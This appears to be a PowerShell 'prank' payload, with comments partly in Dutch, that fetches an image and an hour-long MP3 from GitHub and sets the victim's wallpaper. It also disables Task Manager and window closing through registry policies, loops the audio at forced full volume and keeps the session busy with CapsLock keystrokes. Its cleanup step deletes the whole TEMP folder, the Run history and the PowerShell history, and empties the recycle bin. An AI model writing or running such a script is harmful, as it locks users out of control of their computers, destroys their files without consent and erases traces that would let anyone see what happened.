# Download Image; replace link to $image to add your own image
$image = "https://raw.githubusercontent.com/VBV11/Prank/refs/heads/main/John.png"
$i = -join($image,"?dl=1")
iwr $i -O $env:TMP\i.png

# Download MP3 file; replace link to $wav to add your own sound
$wav = "https://github.com/VBV11/Prank/raw/refs/heads/main/JOHN%20PORK%20IS%20CALLING%20%5B1%20Hour%5D%20%5Bnh4Da0PgacI%5D%20(mp3cut.net).mp3"
iwr $wav -O $env:TMP\s.mp3

# Blokkeer afsluiten en taakbeheer
Write-Host "Beveiliging ingeschakeld..."
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoClose" -Value 1 -Type DWord

# Minimize all windows
Function Show-Desktop {
    $shell = New-Object -ComObject "Shell.Application"
    $shell.MinimizeAll()
}

# Voorkom pauzeren van het script
function Prevent-Pause {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while ($true) {
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) { break }
        else {
            $o.SendKeys("{CAPSLOCK}")
            Start-Sleep -Seconds 3
        }
    }
}

# Speel audio af en herstart indien nodig
function Play-MP3 {
    Add-Type -AssemblyName presentationCore
    $mediaPlayer = New-Object system.windows.media.mediaplayer
    $mediaPlayer.open("$env:TMP\s.mp3")
    $mediaPlayer.Volume = 1.0
    $mediaPlayer.Play()

    while ($true) {
        Start-Sleep -Seconds 1
        if ($mediaPlayer.NaturalDuration.HasTimeSpan -and $mediaPlayer.Position -ge $mediaPlayer.NaturalDuration.TimeSpan) {
            $mediaPlayer.Position = [TimeSpan]::Zero
            $mediaPlayer.Play()
        }
        $o = New-Object -ComObject WScript.Shell
        for ($i = 0; $i -lt 50; $i++) {
            $o.SendKeys([char] 175)  # Houd volume op 100%
        }
    }
}

# Stel wallpaper in
Function Set-WallPaper {
    param ([parameter(Mandatory=$True)] [string]$Image)
    Add-Type -TypeDefinition @" 
    using System; 
    using System.Runtime.InteropServices;
    public class Params {
        [DllImport("User32.dll",CharSet=CharSet.Unicode)]
        public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam, String lpvParam, Int32 fuWinIni);
    }
"@ 
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
    [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

# Zorg ervoor dat volume 100% blijft
$k = [Math]::Ceiling(100/2)
$o = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt $k; $i++) { $o.SendKeys([char] 175) }

# Voer functies uit
Show-Desktop
Prevent-Pause
Set-WallPaper -Image "$env:TMP\i.png"
Play-MP3

# Cleanup (optioneel)
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Zet CapsLock uit als hij aan stond
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true) {
    $key = New-Object -ComObject WScript.Shell
    $key.SendKeys('{CapsLock}')
}
